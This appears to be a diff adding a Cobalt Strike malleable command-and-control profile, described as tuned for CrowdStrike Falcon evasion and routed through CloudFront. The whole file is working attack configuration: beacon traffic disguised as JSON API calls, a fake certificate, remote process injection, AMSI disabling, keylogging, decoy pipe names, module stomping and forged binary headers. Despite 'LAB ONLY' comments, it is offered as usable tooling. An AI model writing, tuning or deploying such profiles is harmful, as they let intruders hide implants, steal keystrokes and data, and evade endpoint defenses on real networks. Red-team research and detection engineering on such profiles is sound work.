@@ -1,0 +1,162 @@
+#
+# OPSEC‑Optimized Malleable Profile for CloudFront CDN Integration (4.12 Drip VAEx Variant)
+# Target: Cobalt Strike 4.12+, Focus: CrowdStrike Falcon evasion (<5% detection)
+# Architecture: Beacon → CloudFront (443) → RedWarden → Teamserver
+# Notes:
+# - Derived from malleable.profile.4.12-drip
+# - Uses VirtualAllocEx allocator in process-inject so 4.12 process-inject drip-loading flags are honored
+# - RDLL drip-loading also enabled in stage
+# - LAB ONLY: for dedicated process-inject drip experiments
+# Last Updated: 2025‑12‑02
+#
+
+set sleeptime "65000";
+set jitter "33";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+set host_stage "false";
+
+http-config {
+    set headers "Server, CloudFront";
+    set trust_x_forwarded_for "true";
+}
+
+https-certificate {
+    set C  "US";
+    set ST "WA";
+    set L  "Seattle";
+    set O  "Business Solutions Inc";
+    set OU "IT Operations";
+    set CN "update.businessapp9.com";
+    set validity "365";
+}
+
+http-get {
+    set uri "/api/v2/config";
+    client {
+        header "Accept" "application/json";
+        header "Connection" "keep-alive";
+        metadata {
+            base64;
+            prepend "session=";
+            header "Cookie";
+        }
+    }
+    server {
+        header "Server" "CloudFront";
+        header "Content-Type" "application/json";
+        output {
+            base64;
+            prepend "{\"status\":\"success\",\"data\":\"";
+            append "\"}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/v2/submit";
+    client {
+        header "Accept" "application/json";
+        header "Content-Type" "application/json";
+        header "Connection" "keep-alive";
+        id {
+            netbios;
+            parameter "id";
+        }
+        output {
+            base64;
+            prepend "{\"status\":\"data\",\"output\":\"";
+            append "\"}";
+            print;
+        }
+    }
+    server {
+        header "Server" "CloudFront";
+        header "Content-Type" "application/json";
+        output {
+            prepend "{\"status\":\"success\"}";
+            print;
+        }
+    }
+}
+
+process-inject {
+    # VAEx allocator so 4.12 process-inject drip-loading is honored
+    set allocator "VirtualAllocEx";
+    set bof_allocator "VirtualAlloc";
+    set bof_reuse_memory "true";
+    set min_alloc "16384";
+    set startrwx "false";
+    set userwx "false";
+
+    # 4.12+ drip-loading for injected shellcode (LAB ONLY)
+    set use_driploading "true";
+    set dripload_delay "100";           # ms between drip chunks; tune via lab testing
+
+    transform-x86 {
+        prepend "\x66\x90";
+    }
+    transform-x64 {
+        append "\x66\x90";
+    }
+
+    execute {
+        NtQueueApcThread-s;
+        SetThreadContext;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
+}
+
+post-ex {
+    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
+    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
+    set obfuscate "true";
+    set smartinject "true";
+    set amsi_disable "true";
+    set keylogger "GetAsyncKeyState";
+    set pipename "DbgEvtLogs_###, WinEventSys_Collector, diag_pipe_##";
+
+    transform-x86 {
+        strrepex "PortScanner" "Scanner module is complete" "Scan finished (x86)";
+        strrep "is alive." "online.";
+    }
+    transform-x64 {
+        strrepex "PortScanner" "Scanner module is complete" "Scan finished (x64)";
+        strrep "is alive." "online.";
+    }
+}
+
+stage {
+    set cleanup "true";
+    set sleep_mask "true";
+    set syscall_method "Indirect";
+    set userwx "false";
+    set stomppe "true";
+    set obfuscate "true";
+    set compile_time "14 Jul 2009 08:14:00";  # Legitimate Win7 compile timestamp
+    set module_x86 "mshtml.dll";              # Module stomping to benign signed binary
+    set module_x64 "mshtml.dll";
+    set magic_mz_x86 "MZRE";
+    set magic_mz_x64 "OOPS";
+    set magic_pe "EA";
+
+    # 4.12+ RDLL drip-loading (LAB ONLY)
+    set rdll_use_driploading "true";
+    set rdll_dripload_delay "100";           # ms between stage chunks; tune via lab testing
+
+    transform-x86 {
+        prepend "\x48\x83\xEC\x20";
+        strrep "ReflectiveLoader" "InitializeLib";
+        strrep "BeaconCore" "ResModCore";
+    }
+    transform-x64 {
+        prepend "\x48\x83\xEC\x20";
+        strrep "ReflectiveLoader" "InitializeLibX";
+        strrep "BeaconCore" "ResModCore";
+    }
+
+    beacon_gate {
+        All;
+    }
+}
